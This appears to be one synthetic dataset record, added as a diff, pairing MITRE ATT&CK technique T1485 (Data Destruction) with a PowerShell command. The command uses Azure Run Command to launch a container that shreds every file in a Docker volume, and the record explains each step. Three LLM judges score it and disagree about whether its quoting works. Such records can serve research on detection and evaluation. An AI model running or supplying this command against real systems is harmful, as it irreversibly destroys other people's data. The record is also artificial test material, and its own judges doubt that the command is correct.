@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Apps' -Name 'LinVM-Containers' -CommandId 'RunShellScript' -ScriptString \"docker run --rm -v projectdata:/data alpine sh -lc 'find /data -type f -print0 | xargs -0 -I{} shred -n 3 -z -u \\\"{}\\\"'\"",
+  "explanation": "For a Docker volume named projectdata on a Linux VM, runs a container to securely overwrite and delete all files within the volume.",
+  "rationale_steps": [
+    "Mount the specific Docker volume into a temporary container.",
+    "Shred all files in the mounted path to irreversibly destroy data without affecting other volumes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-6e3aa0c6",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "The PowerShell -ScriptString uses a double-quoted string containing unescaped double quotes (\"{}\") which will terminate the string prematurely since backslash does not escape quotes in PowerShell, making the command likely to fail parsing.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually it securely overwrites and deletes files in the Docker volume (aligned with T1485), but using the bare alpine image likely lacks the shred utility and thus would not achieve the intended destruction without installing coreutils.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:47:03.221934Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper PowerShell cmdlet syntax and nested quoting using escaped double quotes inside the shell string, though the complex multi-level quoting (PowerShell → RunShellScript → sh -lc → shred) may cause edge-case parsing issues depending on how Azure's RunCommand API handles the ScriptString parameter.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1485 Data Destruction by using Azure VM Run Command to remotely execute a Docker container that mounts the target volume and applies shred (-n 3 overwrites three times, -z zeroes, -u unlinks) to every file found via find, which is a textbook secure deletion approach that renders data unrecoverable and aligns precisely with the described technique.",
+        "combined_score": 4.5,
+        "confidence": null,
+        "timestamp": "2026-02-19T01:41:33.191145Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command and nested Docker/shell strings are well-formed, with balanced quotes and valid parameter usage for the Az module.",
+        "semantic_score": 4,
+        "semantic_justification": "The command logic perfectly aligns with T1485 (Data Destruction) by using a container to wipe a volume; however, the use of backslash-escaped quotes (\\\") inside a PowerShell double-quoted string will result in literal backslashes being passed to the Linux shell, which would cause 'shred' to fail as it looks for filenames containing literal quotes.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T01:41:44.249745Z"
+      }
+    ],
+    "llm_average_syntactic": 3.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
